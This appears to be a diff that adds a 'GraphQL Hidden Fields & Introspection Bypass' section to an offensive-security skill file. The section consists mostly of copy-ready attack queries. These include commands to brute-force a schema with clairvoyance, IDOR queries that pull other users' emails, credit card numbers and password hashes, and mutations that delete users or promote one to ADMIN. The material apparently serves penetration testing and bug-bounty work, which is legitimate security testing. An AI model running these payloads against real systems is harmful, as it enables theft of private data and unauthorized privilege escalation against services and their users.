@@ -1216,3 +1216,63 @@ python3 scripts/graphql_raider.py --url https://target.com/graphql \
 
 - `references/graphql-payloads.md` — injection, IDOR, batching, and depth payloads ready to copy
 - `references/tools.md` — InQL, graphw00f, clairvoyance, Altair, graphql-cop usage
+
+---
+
+## From hack-skills: GraphQL Hidden Fields & Introspection Bypass
+
+### When Introspection Is Restricted
+
+```graphql
+# 1. Try field name suggestions — GraphQL error messages often name valid fields:
+{ user { TYPO } }   # → "Did you mean: 'token'?"
+
+# 2. Query known type names directly:
+{ __type(name: "User") { fields { name type { name } } } }
+{ __type(name: "Admin") { fields { name type { name } } } }
+
+# 3. Use clairvoyance to brute-force schema from wordlists:
+#    pip install clairvoyance
+#    clairvoyance -u https://target.com/graphql -o schema.json -w wordlist.txt
+```
+
+### Hidden Fields in Known Types
+
+```graphql
+# Mobile app / JS bundle extraction — grep for hidden field names:
+# grep -r "query\|mutation\|subscription\|fragment" *.js | grep -Eo '[a-zA-Z_]{3,30}' | sort -u
+
+# Try querying @deprecated fields — often still functional:
+{ user { id email internalRole __isDeprecated } }
+
+# Fields visible to admin but not in public docs:
+{ user { id email role orgId featureFlags } }
+{ organization { id name billingPlan adminUsers { id email } } }
+```
+
+### High-Value Authorization Tests
+
+```graphql
+# IDOR via GraphQL: change IDs in queries for another user's data
+{ user(id: "2") { email phone creditCards { number } } }
+{ order(id: "ABC") { items { price } user { email } } }
+
+# Nested authorization gaps — parent authorized but child returns unauthorized data:
+{ posts { id title author { email passwordHash } } }
+
+# Hidden admin mutations exposed via schema drift:
+mutation { deleteUser(id: "1") { success } }
+mutation { updateRole(userId: "2", role: "ADMIN") { user { role } } }
+```
+
+### Hidden Parameter Discovery
+
+```
+Sources for undocumented parameters:
+- Admin API docs vs public docs — admin endpoints often accept additional fields
+- JSON `additionalProperties` / `extraFields` patterns
+- Mobile app binary strings: strings app.ipa | grep -E '^[a-z_]{4,25}$'
+- Frontend code: role, orgId, featureFlag, internal, debug, bypass fields in forms
+- Error responses: "unknown argument X" reveals argument names
+- API version drift: /graphql/v2/ may expose fields removed from /graphql/v1/
+```
